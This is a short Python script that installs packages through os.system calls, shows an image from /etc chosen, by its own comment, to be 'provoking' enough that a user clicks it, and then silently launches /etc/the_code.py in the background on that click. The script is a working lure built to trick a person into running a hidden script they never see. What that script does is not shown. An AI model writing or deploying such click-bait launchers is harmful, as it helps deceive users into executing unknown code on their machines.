# automatically installing the necessary modules
import os
os.system("apt-get install python3-tk")
os.system("pip install --upgrade Pillow")
os.system("apt upgrade python3-pillow")

# using tkinter to open the file
import tkinter as tk
from PIL import ImageTk, Image
import subprocess

# a function that calls "python3 /etc/the_code" command in the background without manually on terminal.
def run_script(event):
    subprocess.Popen(["python3","/etc/the_code.py"])

# calling root as tk class object
root = tk.Tk()

# calling whatever image that may be provoking for the user to click on desktop.
image = Image.open("/etc/image.png")
photo = ImageTk.PhotoImage(image)

#combining the said tk object with the image configured above.
label = tk.Label(root, image=photo)

# binding it with a user interactice button. In this case, "<Button-1>" should be the left button of the mouse. And when it's been clicked, run the script.
label.bind("<Button-1>", run_script)
label.pack()

root.mainloop()